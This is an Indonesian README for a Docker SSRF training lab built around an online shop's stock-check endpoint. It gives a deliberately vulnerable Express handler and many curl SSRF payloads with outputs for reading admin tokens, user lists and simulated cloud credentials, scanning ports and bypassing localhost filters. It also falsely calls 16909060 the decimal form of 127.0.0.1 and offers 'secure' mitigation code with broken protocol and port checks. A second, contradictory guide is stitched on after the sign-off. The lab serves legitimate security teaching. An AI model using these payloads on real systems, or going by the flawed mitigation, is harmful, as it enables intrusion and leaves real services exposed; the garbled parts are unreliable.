# Lab Pembelajaran SSRF - Skenario Toko Online Sederhana

Lab ini menyediakan lingkungan yang aman dan mandiri untuk belajar dan berlatih kerentanan Server-Side Request Forgery (SSRF) yang realistis dalam konteks toko online. Dengan dua versi aplikasi UI, Anda dapat mengeksplorasi SSRF dari perspektif dasar hingga implementasi yang lebih realistis dengan pemeriksaan stok otomatis.

---

## 📋 Daftar Isi

1. [Ringkasan](#ringkasan)
2. [Arsitektur](#arsitektur)
3. [Cara Menjalankan Lab](#cara-menjalankan-lab)
4. [User Guide](#user-guide)
   - [Path `/` - Manual Stock Checking](#path--manual-stock-checking)
   - [Path `/v2` - Automatic Stock Checking](#path-v2--automatic-stock-checking)
5. [Testing & Exploitation](#testing--exploitation)
   - [Menggunakan UI Web](#menggunakan-ui-web)
   - [Menggunakan Burp Suite](#menggunakan-burp-suite)
   - [Menggunakan Browser DevTools](#menggunakan-browser-devtools)
   - [Menggunakan curl](#menggunakan-curl)
6. [Serangan & Payload](#serangan--payload)
7. [Dokumentasi Teknis](#dokumentasi-teknis)
   - [Struktur Data](#struktur-data)
   - [API Endpoints](#api-endpoints)
   - [Kerentanan SSRF Dijelaskan](#kerentanan-ssrf-dijelaskan)
8. [Membersihkan](#membersihkan)

---

## Ringkasan

**SSRF (Server-Side Request Forgery)** adalah kerentanan yang memungkinkan penyerang membuat aplikasi server membuat permintaan HTTP ke target yang tidak diinginkan, seringkali layanan internal yang tidak dapat diakses dari internet. Lab ini mensimulasikan skenario dunia nyata di mana toko online memeriksa ketersediaan stok dari supplier berbeda menggunakan URL yang disediakan secara dinamis.

**Lab menyediakan:**

- ✅ Aplikasi toko online yang rentan terhadap SSRF
- ✅ API internal tersembunyi dengan data sensitif
- ✅ Dua versi UI untuk tujuan pembelajaran berbeda
- ✅ Multiple attack vectors dan payload
- ✅ Lingkungan Docker terisolasi untuk keamanan

---

## Arsitektur

Sistem terdiri dari dua layanan Node.js/Express yang diorkestrasi oleh Docker Compose dalam jaringan terisolasi:

```
┌─────────────────────────────────────────────────────────┐
│                    HOST MACHINE                         │
│  http://localhost:3000 (exposed to browser)             │
└────────────────┬────────────────────────────────────────┘
                 │
        ┌────────┴────────┐
        │                 │
┌──────▼────────┐  ┌─────▼──────────┐
│  web-app      │  │  (Not exposed  │
│  :3000        │  │   to host)     │
│               │  │                │
│ - Front-end   │  │  internal-api  │
│ - Routes /    │  │  :4000         │
│   and /v2     │  │                │
│ - SSRF vuln   │  │ - Stock mgmt   │
│   at /api/    │  │ - Admin config │
│   stock       │  │ - User data    │
│               │  │ - Cloud meta   │
└──────┬────────┘  └─────┬──────────┘
       │                 │
       └─────────────────┘
    Docker Bridge Network
     (ssrf-network)
```

### Layanan Detail

#### `web-app` (Port 3000 - Exposed)

Aplikasi toko online publik dengan kerentanan SSRF. Hanya layanan ini yang dapat diakses dari mesin host.

| Fitur                 | Deskripsi                                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **Path `/`**          | UI manual stock checking dengan tombol. Pengguna harus mengklik tombol untuk memeriksa stok masing-masing lokasi.                |
| **Path `/v2`**        | UI v2 dengan automatic stock checking. Saat halaman dimuat, sistem otomatis memeriksa stok dari semua 4 lokasi secara bersamaan. |
| **Path `/api/stock`** | Endpoint rentan yang menerima parameter `url` dan membuat permintaan server-side. **Ini adalah pintu masuk untuk SSRF.**         |

#### `internal-api` (Port 4000 - Not Exposed)

API internal yang mensimulasikan layanan korporat dengan data sensitif. Tidak dapat diakses langsung dari mesin host, hanya dari dalam Docker network.

| Endpoint                  | Deskripsi                                                                                           |
| ------------------------- | --------------------------------------------------------------------------------------------------- |
| `GET /v1/stock/:location` | Mengembalikan data stok untuk lokasi spesifik (london, paris, berlin, tokyo) termasuk **quantity**. |
| `GET /v1/admin/config`    | Data konfigurasi admin dengan token sensitif. Contains flag: `SSRF_LAB_SUCCESS_PATH_TRAVERSAL`      |
| `GET /data`               | Endpoint data umum. Contains flag: `SSRF_LAB_SUCCESS_HOST_BYPASS`                                   |
| `GET /users`              | Mengembalikan daftar pengguna internal (simulasi data pelanggan).                                   |
| `GET /metadata`           | Simulasi AWS EC2 metadata endpoint. Contains flag: `SSRF_LAB_SUCCESS_CLOUD_METADATA`                |

---

## Cara Menjalankan Lab

### Prerequisites

- Docker dan Docker Compose (versi 1.29+)
- Browser modern (Chrome, Firefox, Safari)
- Terminal/Command line

### Langkah-Langkah

1. **Clone atau navigasi ke direktori proyek:**

   ```bash
   cd /path/to/ssrf-lab
   ```

2. **Build dan jalankan container:**

   ```bash
   docker compose up --build
   ```

   Output akan terlihat seperti:

   ```
   Creating ssrf-lab-web-app-1 ... done
   Creating ssrf-lab-internal-api-1 ... done
   web-app | Web app with stock checking feature listening at http://localhost:3000
   internal-api | Internal API listening on port 4000
   ```

3. **Akses aplikasi:**
   - Buka browser
   - Navigasi ke `http://localhost:3000`
   - Anda akan melihat path `/` secara default

4. **Hentikan lab:**

   ```
   Tekan Ctrl+C di terminal
   ```

5. **Bersihkan resource:**
   ```bash
   docker compose down
   ```

---

## User Guide

### Path `/` - Manual Stock Checking

**Tujuan:** UI baseline untuk memahami alur permintaan HTTP manual.

#### Fitur:

- Menampilkan 4 produk: Laptop, Smartphone, Headphones, Tablet
- Masing-masing produk memiliki tombol "Check Stock" yang hardcoded ke lokasi berbeda
- Pengguna harus **mengklik manualnya** untuk memeriksa stok
- Hasil ditampilkan sebagai JSON mentah

#### Cara Menggunakan:

1. Buka `http://localhost:3000/`
2. Lihat 4 produk dengan tombol "Check Stock"
3. Klik tombol pada salah satu produk
4. Tunggu respons (2-4 detik)
5. Lihat JSON response dengan format:
   ```json
   {
     "location": "london",
     "status": "In Stock",
     "quantity": 45
   }
   ```

#### URL Hardcoded:

- Laptop → `http://internal-api:4000/v1/stock/london`
- Smartphone → `http://internal-api:4000/v1/stock/paris`
- Headphones → `http://internal-api:4000/v1/stock/berlin`
- Tablet → `http://internal-api:4000/v1/stock/tokyo`

#### Gunakan untuk:

- Memahami alur request-response dasar
- Menguji manual SSRF injection
- Berlatih menggunakan Burp Suite atau DevTools
- Testing individual payload

---

### Path `/v2` - Automatic Stock Checking

**Tujuan:** UI next-generation yang mensimulasikan sistem real-time yang lebih realistis.

#### Fitur:

- Menampilkan 4 produk yang sama seperti `/`
- **Automatic** memeriksa stok dari **semua 4 lokasi** saat halaman dimuat
- Menggunakan `Promise.all()` untuk parallel requests (lebih cepat)
- Hasil ditampilkan dalam **table format** yang clean
- Menampilkan **Status** dan **Quantity** secara visual
- Color-coded: Green untuk "In Stock", Red untuk "Out of Stock"

#### Cara Menggunakan:

1. Buka `http://localhost:3000/v2`
2. Tunggu pesan "Loading stock information from all locations..." menghilang
3. Lihat tabel "Stock Availability" populate otomatis dengan 4 baris:

   | Location | Status       | Available Quantity |
   | -------- | ------------ | ------------------ |
   | London   | In Stock     | 45 units           |
   | Paris    | Out of Stock | 0 units            |
   | Berlin   | In Stock     | 12 units           |
   | Tokyo    | Out of Stock | 0 units            |

4. Refresh halaman (`F5` atau `Cmd+R`) untuk melihat auto-check trigger lagi

#### Keunggulan `/v2`:

- **Realistic:** Inventory check otomatis seperti sistem real
- **Parallel loading:** Lebih cepat karena fetch semua lokasi sekaligus
- **Better UX:** Table view vs JSON mentah
- **Production-like:** Menunjukkan real-world scenario lebih baik

#### Gunakan untuk:

- Mengeksplorasi karakteristik real-time systems
- Memahami parallel request handling
- Testing SSRF dengan timing elements
- Pembelajaran lanjutan tentang API integration

---

## Testing & Exploitation

### Menggunakan UI Web

**Method paling sederhana untuk pemula.**

#### Di Path `/`:

1. Buka `http://localhost:3000/`
2. Klik "Check Stock" pada produk
3. Lihat respons JSON di bawah
4. Respons menunjukkan struktur data lengkap termasuk `quantity`

#### Di Path `/v2`:

1. Buka `http://localhost:3000/v2`
2. Tunggu auto-checking selesai
3. Lihat tabel dengan status dan quantity
4. Refresh untuk melihat auto-check trigger ulang

---

### Menggunakan Burp Suite

**Metode intermediate untuk melihat dan memodifikasi request HTTP.**

#### Setup:

1. Download Burp Suite Community Edition: https://portswigger.net/burp/communitydownload
2. Install dan jalankan Burp Suite
3. Konfigurasi browser proxy ke `127.0.0.1:8080`
4. Buka Burp → Proxy → Intercept tab → "Intercept is on"

#### Testing:

1. Di browser (proxied), buka `http://localhost:3000/`
2. Klik "Check Stock" pada produk apapun
3. Burp akan intercept request ke `/api/stock?url=...`
4. Klik "Forward" atau ubah parameter `url` sebelum forward
5. Lihat respons di Burp atau browser

#### Modifikasi untuk Attack:

1. Burp intercept request ke `/api/stock?url=...`
2. Ubah parameter `url` dari:
   ```
   http://internal-api:4000/v1/stock/london
   ```
   Ke endpoint sensitif (lihat [Serangan & Payload](#serangan--payload)):
   ```
   http://internal-api:4000/v1/admin/config
   ```
3. Klik "Forward"
4. Lihat respons sensitif di browser atau Burp "Response" tab

---

### Menggunakan Browser DevTools

**Metode cepat menggunakan built-in browser tools.**

#### Testing:

1. Buka `http://localhost:3000/` di Chrome/Firefox
2. Tekan `F12` untuk buka DevTools
3. Pergi ke tab "Network"
4. Klik "Check Stock" pada produk
5. Lihat request ke `/api/stock?url=...` di network tab
6. Klik request, lihat "Response" tab untuk JSON
7. Lihat response sudah include `quantity` field dari internal-api

#### Modifikasi via Console:

1. Pergi ke tab "Console" di DevTools
2. Jalankan custom fetch:
   ```javascript
   fetch(
     "/api/stock?url=" +
       encodeURIComponent("http://internal-api:4000/v1/admin/config"),
   )
     .then((r) => r.json())
     .then((d) => console.log(JSON.stringify(d, null, 2)));
   ```
3. Lihat respons di console
4. Anda sudah berhasil melakukan SSRF attack!

---

### Menggunakan curl

**Metode command-line untuk testing cepat dan scripting.**

#### Basic Request:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/london"
```

Output:

```json
{
  "location": "london",
  "status": "In Stock",
  "quantity": 45
}
```

#### Dengan URL Encoding (untuk payload complex):

```bash
curl "http://localhost:3000/api/stock?url=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("http://internal-api:4000/v1/admin/config"))')"
```

#### Dengan jq untuk pretty-print (jika installed):

```bash
curl -s "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/berlin" | jq .
```

---

## Serangan & Payload

### Serangan 1: Admin Configuration Disclosure

**Target:** `GET /v1/admin/config` yang berisi token sensitif

**Payload:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/admin/config"
```

**Hasil:**

```json
{
  "admin_token": "SSRF_LAB_SUCCESS_PATH_TRAVERSAL",
  "internal_status": "Secure"
}
```

**Flag:** `SSRF_LAB_SUCCESS_PATH_TRAVERSAL`

**Learning:** Akses ke endpoint admin yang otherwise tidak bisa dijangkau dari publik.

---

### Serangan 2: Generic Data Endpoint

**Target:** `/data` endpoint yang berisi informasi internal

**Payload:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/data"
```

**Hasil:**

```json
{
  "message": "You reached the internal data endpoint!",
  "flag": "SSRF_LAB_SUCCESS_HOST_BYPASS"
}
```

**Flag:** `SSRF_LAB_SUCCESS_HOST_BYPASS`

**Learning:** Bypass host restrictions dan akses endpoint tidak terdaftar.

---

### Serangan 3: User Data Enumeration

**Target:** `/users` endpoint yang berisi data pelanggan

**Payload:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/users"
```

**Hasil:**

```json
[
  {
    "id": "usr-001",
    "name": "Admin User",
    "email": "admin@internal-corp.thm",
    "role": "administrator"
  },
  {
    "id": "usr-002",
    "name": "Jane Doe",
    "email": "jane.doe@internal-corp.thm",
    "role": "support_engineer"
  }
]
```

**Learning:** Enumerasi data sensitif seperti user credentials dan role information.

---

### Serangan 4: Cloud Metadata Simulation

**Target:** `/metadata` yang mensimulasikan AWS/Cloud metadata endpoint

**Payload:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/metadata"
```

**Hasil:**

```json
{
  "instance_id": "i-1234567890abcdef0",
  "security_credentials": {
    "access_key": "AKIAIOSFODNN7EXAMPLE",
    "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  },
  "iam_role": "ec2-instance-role",
  "flag": "SSRF_LAB_SUCCESS_CLOUD_METADATA"
}
```

**Flag:** `SSRF_LAB_SUCCESS_CLOUD_METADATA`

**Learning:** Akses cloud metadata yang sering digunakan untuk credential theft dalam real-world attacks.

---

### Serangan 5: Stock Information Enumeration

**Target:** Semua lokasi `/v1/stock/*` untuk mapping inventory

**Payload 1 - London:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/london"
```

Response: `{"location": "london", "status": "In Stock", "quantity": 45}`

**Payload 2 - Paris:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/paris"
```

Response: `{"location": "paris", "status": "Out of Stock", "quantity": 0}`

**Payload 3 - Berlin:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/berlin"
```

Response: `{"location": "berlin", "status": "In Stock", "quantity": 12}`

**Payload 4 - Tokyo:**

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/tokyo"
```

Response: `{"location": "tokyo", "status": "Out of Stock", "quantity": 0}`

**Learning:** Complete enumeration menggunakan SSRF untuk mapping internal network structure.

---

### Serangan Lanjutan: Alternative Representations

#### IPv6 Localhost:

```bash
curl "http://localhost:3000/api/stock?url=http://[::1]:4000/v1/admin/config"
```

#### Decimal IP:

```bash
curl "http://localhost:3000/api/stock?url=http://16909060:4000/v1/admin/config"
```

(Note: 16909060 adalah decimal representation dari 127.0.0.1)

#### Hostname Variation:

```bash
curl "http://localhost:3000/api/stock?url=http://127.0.0.1:4000/v1/admin/config"
```

---

## Dokumentasi Teknis

### Struktur Data

#### JSON Format: Stock Information

**File:** `internal-api/stock.json`

```json
[
  {
    "location": "london",
    "status": "In Stock",
    "quantity": 45
  },
  {
    "location": "paris",
    "status": "Out of Stock",
    "quantity": 0
  },
  {
    "location": "berlin",
    "status": "In Stock",
    "quantity": 12
  },
  {
    "location": "tokyo",
    "status": "Out of Stock",
    "quantity": 0
  }
]
```

**Fields:**

- `location` (string): Nama lokasi warehouse
- `status` (string): "In Stock" atau "Out of Stock"
- `quantity` (number): Jumlah unit tersedia

---

#### JSON Format: User Information

**File:** `internal-api/users.json`

```json
[
  {
    "id": "usr-001",
    "name": "Admin User",
    "email": "admin@internal-corp.thm",
    "role": "administrator"
  },
  {
    "id": "usr-002",
    "name": "Jane Doe",
    "email": "jane.doe@internal-corp.thm",
    "role": "support_engineer"
  }
]
```

---

### API Endpoints

#### Web App Endpoints

| Method | Path         | Vulnerable | Deskripsi                       |
| ------ | ------------ | ---------- | ------------------------------- |
| `GET`  | `/`          | ❌         | UI dengan manual stock checking |
| `GET`  | `/v2`        | ❌         | UI dengan auto stock checking   |
| `GET`  | `/api/stock` | ✅         | Vulnerable SSRF endpoint        |

#### Internal API Endpoints

| Method | Path                  | Public Access | Sensitive | Deskripsi                                   |
| ------ | --------------------- | ------------- | --------- | ------------------------------------------- |
| `GET`  | `/v1/stock/:location` | ❌            | ✅        | Stock data per lokasi (includes quantity)   |
| `GET`  | `/v1/admin/config`    | ❌            | ✅✅✅    | Admin token dan config (HIGH VALUE)         |
| `GET`  | `/data`               | ❌            | ✅        | Generic internal data                       |
| `GET`  | `/users`              | ❌            | ✅✅      | User list dan credentials                   |
| `GET`  | `/metadata`           | ❌            | ✅✅✅    | Cloud metadata simulation (HIGHLY CRITICAL) |

---

### Kerentanan SSRF Dijelaskan

#### Apa itu SSRF?

**Server-Side Request Forgery (SSRF)** adalah kerentanan yang memungkinkan penyerang membuat server membuat permintaan HTTP ke target yang tidak diinginkan. Server bertindak sebagai "proxy" tidak disengaja untuk request penyerang.

#### Karakteristik:

| Aspek               | Detail                                                      |
| ------------------- | ----------------------------------------------------------- |
| **Tipe Kerentanan** | CWE-918                                                     |
| **Severity**        | High - Critical (tergantung target dan data)                |
| **Root Cause**      | Input validation yang tidak sufficient                      |
| **Impact**          | Akses ke internal services, data disclosure, RCE (indirect) |
| **Difficulty**      | Easy to exploit, Hard to detect                             |

#### Siklus Attack:

```
┌──────────────────┐
│ 1. Attacker      │
│    Input URL     │
│ (malicious)      │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐      ┌─────────────────┐
│ 2. Web App       │     │ 3. External      │
│    Receives URL  │────→│    To Internal   │
│    & validates   │     │    (TARGET)      │
│    (POORLY)      │     │                  │
└──────────────────┘     └─────────────────┘
         │
         ▼
┌──────────────────┐
│ 4. Server makes  │
│ request to URL   │
│ (can't restrict) │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ 5. Response      │
│ returned to      │
│ attacker         │
└──────────────────┘
```

#### Lab Examples:

1. **Path Traversal SSRF:**
   - Input: `http://internal-api:4000/v1/admin/config`
   - Impact: Bypass path restrictions
   - Flag: `SSRF_LAB_SUCCESS_PATH_TRAVERSAL`

2. **Host Bypass SSRF:**
   - Input: `http://internal-api:4000/data`
   - Impact: Access to non-listed endpoints
   - Flag: `SSRF_LAB_SUCCESS_HOST_BYPASS`

3. **Cloud Metadata SSRF:**
   - Input: `http://internal-api:4000/metadata`
   - Impact: Credential theft, privilege escalation
   - Flag: `SSRF_LAB_SUCCESS_CLOUD_METADATA`

---

#### Mengapa Lab Vulnerable?

```javascript
// web-app/app.js
app.get("/api/stock", async (req, res) => {
  const { url } = req.query; // ❌ Takes user input

  // ❌ No validation!
  // ❌ No whitelist!
  // ❌ No blacklist!

  try {
    const response = await axios.get(url); // ❌ Directly use URL
    res.json(response.data); // ❌ Return response
  } catch (error) {
    res.status(500).json({ error: error.message }); // ❌ Leak error info
  }
});
```

**Problems:**

1. **No URL validation** - accepts any URL
2. **No allowlist** - dapat request ke mana saja
3. **No error sanitization** - error messages leak network info
4. **Direct axios.get()** - no proxy atau filtering

---

#### Mitigasi (Apa yang HARUS dilakukan):

```javascript
// SECURE VERSION (Education purpose only)

const url = new URL(req.query.url);

// ✅ Whitelist allowed hosts
const allowedHosts = ["supplier1.com", "supplier2.com"];
if (!allowedHosts.includes(url.hostname)) {
  return res.status(403).json({ error: "Host not allowed" });
}

// ✅ Whitelist allowed ports
const allowedPorts = ["80", "443"];
if (!allowedPorts.includes(url.port)) {
  return res.status(403).json({ error: "Port not allowed" });
}

// ✅ Blacklist dangerous protocols
const bannedProtocols = ["file://", "gopher://", "ftp://"];
if (bannedProtocols.includes(url.protocol)) {
  return res.status(403).json({ error: "Protocol not allowed" });
}

// ✅ Block private IP ranges
const isPrivate =
  /^(10\.|\b192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|\b127\.|localhost|\b::1\b|169\.254\.)/.test(
    url.hostname,
  );
if (isPrivate) {
  return res.status(403).json({ error: "Private networks forbidden" });
}

// ✅ Use timeout dan response validation
const response = await axios.get(url, {
  timeout: 2000,
  maxRedirects: 0,
  validateStatus: (status) => status < 400,
});
```

---

## Membersihkan

### Stop Lab

Di terminal tempat `docker compose` berjalan:

```bash
Tekan Ctrl+C
```

### Remove Containers dan Networks

```bash
docker compose down
```

### Remove Images (optional - untuk clean state):

```bash
docker compose down --rmi all
```

### Verify Cleanup:

```bash
docker ps -a              # Tidak ada container
docker images | grep ssrf # Tidak ada image
```

---

## Troubleshooting

### Port 3000 sudah digunakan

**Error:** `bind: address already in use`

**Solusi:**

```bash
# Cari process yang menggunakan port 3000
lsof -i :3000

# Kill process (ganti PID dengan hasil lsof)
kill -9 <PID>

# Atau ubah port di docker-compose.yml
```

### Connection refused ke internal-api

**Error:** `connect ECONNREFUSED 172.18.0.2:4000`

**Solusi:**

- Pastikan docker compose sedang berjalan (`docker compose up`)
- Pastikan akses dari dalam container (URL: `http://internal-api:4000`)
- Jangan akses `http://localhost:4000` dari host (not exposed)

### Changes tidak terlihat setelah edit

**Solusi:**

```bash
# Stop containers
docker compose down

# Rebuild images
docker compose up --build

# Atau force rebuild tanpa cache
docker compose up --build --no-cache
```

---

## Learning Resources

- **OWASP Blog SSRF:** https://owasp.org/www-community/attacks/Server-Side_Request_Forgery
- **HackTricks SSRF:** https://book.hacktricks.xyz/pentesting-web/server-side-request-forgery-ssrf
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security/ssrf

---

## License

Lab ini digunakan untuk tujuan pembelajaran keamanan siber. Jangan gunakan untuk aktivitas yang tidak sah.

---

**Selamat belajar! 🚀**

Burp Suite adalah alat proxy web populer untuk mencegat dan memodifikasi permintaan HTTP. Metode ini bagus untuk pemula melihat bagaimana permintaan bekerja.

1. **Download Burp Suite Community Edition**: Kunjungi https://portswigger.net/burp/communitydownload dan download versi gratis.
2. **Install dan Jalankan**: Install Burp Suite CE dan mulai.
3. **Konfigurasi Proxy Browser**: Atur browser Anda (mis. Chrome) untuk menggunakan proxy `127.0.0.1:8080` (periksa tab Proxy Burp untuk port).
4. **Aktifkan Intercept**: Di Burp, pergi ke Proxy > tab Intercept dan nyalakan "Intercept is on".
5. **Test Lab**: Buka `http://localhost:3000` di browser dan klik "Check Stock" pada produk.
6. **Intercept Permintaan**: Burp akan menangkap permintaan ke `/api/stock?url=...`. Klik "Forward" untuk melihatnya.
7. **Modifikasi dan Serang**: Ubah parameter `url` ke endpoint internal, mis. `http://internal-api:4000/v1/admin/config`. Kemudian klik "Forward" untuk kirim.
8. **Amati Respons**: Periksa respons di Burp atau browser untuk data yang bocor.

### Menggunakan Inspect Element Browser

Gunakan alat developer browser untuk memeriksa dan memodifikasi permintaan secara langsung.

1. **Buka Developer Tools**: Buka `http://localhost:3000` di Chrome atau Firefox. Klik kanan dan pilih "Inspect" (atau tekan F12).
2. **Pergi ke Tab Network**: Klik tab "Network" di DevTools.
3. **Picu Permintaan**: Klik "Check Stock" pada produk.
4. **Temukan Permintaan**: Cari permintaan ke `/api/stock` di log jaringan.
5. **Copy as cURL**: Klik kanan permintaan dan pilih "Copy > Copy as cURL".
6. **Modifikasi di Terminal**: Tempel perintah cURL ke terminal. Ubah parameter URL setelah `url=` ke endpoint internal, mis. `http://internal-api:4000/data`.
7. **Jalankan dan Amati**: Eksekusi perintah cURL yang dimodifikasi dan lihat respons.

### Menggunakan curl (Command Line)

Gunakan perintah `curl` untuk langsung menguji endpoint `/api/stock` dengan URL berbeda. Ini memungkinkan Anda membuat serangan spesifik.

Contoh:

```bash
curl "http://localhost:3000/api/stock?url=http://example.com/stock.json"
```

## Mengeksekusi Serangan

Tujuannya adalah mengeksploitasi kerentanan SSRF di fitur "Stock Checking" toko online untuk mengakses endpoint sensitif di layanan `internal-api`.

- **Endpoint Rentan:** `GET /api/stock?url=`
- **Parameter Rentan:** `url` (parameter query)
- **Logika Dimaksud:** Toko online memungkinkan supplier memberikan data stok via URL untuk pemeriksaan inventaris real-time. Ini mengharapkan URL seperti `http://supplier.com/stock.json`.
- **Kelemahan:** Aplikasi tidak memvalidasi URL yang diberikan dengan benar. Ini hanya mengambil URL apa pun yang diberikan. Ini memungkinkan penyerang memaksa server membuat permintaan ke layanan internal.

  Ini adalah bentuk **semi-blind SSRF**. Aplikasi akan mengembalikan data respons jika berhasil, tetapi error mungkin bocor informasi tentang jaringan internal. Anda harus memantau log server (di terminal `docker compose`) untuk mengonfirmasi permintaan dibuat.

### Serangan: Mengakses Endpoint Admin Internal

Serangan ini memaksa server membuat permintaan ke endpoint `/v1/admin/config` di internal API, yang berisi data konfigurasi toko sensitif.

**Eksekusi:**

Gunakan `curl` untuk mengirim permintaan yang dibuat. Payload menunjuk ke layanan internal.

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/admin/config"
```

**Hasil Diharapkan:**

1.  **Di terminal `curl` Anda**, Anda akan menerima data sensitif:

    ```json
    {
      "admin_token": "SSRF_LAB_SUCCESS_PATH_TRAVERSAL",
      "internal_status": "Secure"
    }
    ```

2.  **Di terminal log `docker compose` Anda**, Anda akan melihat log dari layanan `web-app`:

    ```
    web-app_1       | Making request to fetch stock from: http://internal-api:4000/v1/admin/config
    ```

Ini mengonfirmasi Anda berhasil membuat server `web-app` meminta data dari layanan internal. Anda menemukan flag `SSRF_LAB_SUCCESS_PATH_TRAVERSAL`!

### Serangan Bonus: Mengakses Endpoint Data Internal

Gunakan teknik yang sama untuk mengakses endpoint `/data`.

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/data"
```

Ini akan mengungkap flag kedua, `SSRF_LAB_SUCCESS_HOST_BYPASS`.

### Serangan Bonus: Enumerasi Lokasi Stok

Akses endpoint pemeriksaan stok dengan lokasi supplier berbeda untuk melihat bagaimana toko memeriksa inventaris dari berbagai gudang:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/london"
```

Respons diharapkan:

```json
{
  "location": "London",
  "status": "In Stock"
}
```

Coba lokasi lain seperti `paris`:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/v1/stock/paris"
```

Respons diharapkan:

```json
{
  "location": "paris",
  "status": "Out of Stock"
}
```

### Serangan Bonus: Port Scanning via SSRF

Gunakan SSRF untuk memindai port terbuka di jaringan internal:

```bash
curl "http://localhost:3000/api/stock?url=http://localhost:4000/"
```

Jika port terbuka, Anda mungkin mendapat respons atau error yang menunjukkan layanan dapat dijangkau.

### Serangan Bonus: Bypass URL Encoding

Coba cara berbeda untuk mereferensikan localhost:

```bash
curl "http://localhost:3000/api/stock?url=http://127.0.0.1:4000/v1/admin/config"
curl "http://localhost:3000/api/stock?url=http://[::1]:4000/v1/admin/config"
```

### Serangan Bonus: Pengungkapan Informasi Berbasis Error

Kirim permintaan ke endpoint yang tidak ada untuk membocorkan informasi jaringan:

```bash
curl "http://localhost:3000/api/stock?url=http://nonexistent.internal:4000/"
```

Pesan error mungkin mengungkap detail tentang jaringan internal.

### Serangan Bonus: Mengakses Data Pelanggan

Eksploitasi SSRF untuk mengakses data pelanggan internal, yang bisa digunakan untuk serangan bertarget atau pelanggaran data:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/users"
```

Respons diharapkan: Daftar pelanggan dengan informasi sensitif.

### Serangan Bonus: Simulasi Akses Metadata Cloud

Akses metadata inventaris berbasis cloud yang disimulasikan, yang mungkin berisi kunci API untuk pembaruan stok otomatis:

```bash
curl "http://localhost:3000/api/stock?url=http://internal-api:4000/metadata"
```

Respons diharapkan: Metadata instance termasuk kredensial simulasi dan flag `SSRF_LAB_SUCCESS_CLOUD_METADATA`.

## Membersihkan

Untuk menghentikan dan menghapus container, tekan `Ctrl+C` di terminal tempat `docker compose` berjalan, lalu jalankan:

```bash
docker compose down
```
